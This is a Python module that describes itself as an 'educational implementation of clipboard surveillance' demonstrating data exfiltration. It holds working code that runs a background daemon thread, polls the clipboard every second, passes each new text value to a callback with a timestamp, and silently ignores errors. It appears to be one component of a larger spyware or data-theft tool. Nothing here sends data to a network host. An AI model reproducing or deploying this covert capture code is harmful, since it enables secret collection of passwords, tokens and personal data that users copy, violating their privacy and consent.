"""
Clipboard Monitoring Module
Educational implementation of clipboard surveillance
"""

import threading
import time
from datetime import datetime
try:
    import pyperclip
except ImportError:
    pyperclip = None


class ClipboardMonitor:
    """
    Monitors clipboard for changes and logs content
    Educational purpose: Demonstrates data exfiltration via clipboard
    """

    def __init__(self, callback, check_interval=1):
        """
        Initialize clipboard monitor

        Args:
            callback (function): Function to call when clipboard changes
                                 Signature: callback(timestamp, content)
            check_interval (int): Seconds between clipboard checks
        """
        self.callback = callback
        self.check_interval = check_interval
        self.running = False
        self.thread = None
        self.last_content = ""

    def start(self):
        """Start monitoring clipboard"""
        if pyperclip is None:
            print("[!] pyperclip not available - clipboard monitoring disabled")
            return False

        if self.running:
            return False

        self.running = True
        self.thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.thread.start()
        return True

    def stop(self):
        """Stop monitoring clipboard"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)

    def _monitor_loop(self):
        """Main monitoring loop"""
        while self.running:
            try:
                current_content = pyperclip.paste()

                # Check if content changed and is not empty
                if current_content and current_content != self.last_content:
                    # Filter out very long content (images as base64, etc.)
                    if len(current_content) < 10000:
                        timestamp = datetime.now()
                        self.callback(timestamp, current_content)
                        self.last_content = current_content

            except Exception as e:
                # Silently ignore errors (clipboard might be locked)
                pass

            time.sleep(self.check_interval)

    def get_current_content(self):
        """Get current clipboard content"""
        try:
            if pyperclip:
                return pyperclip.paste()
        except:
            pass
        return None
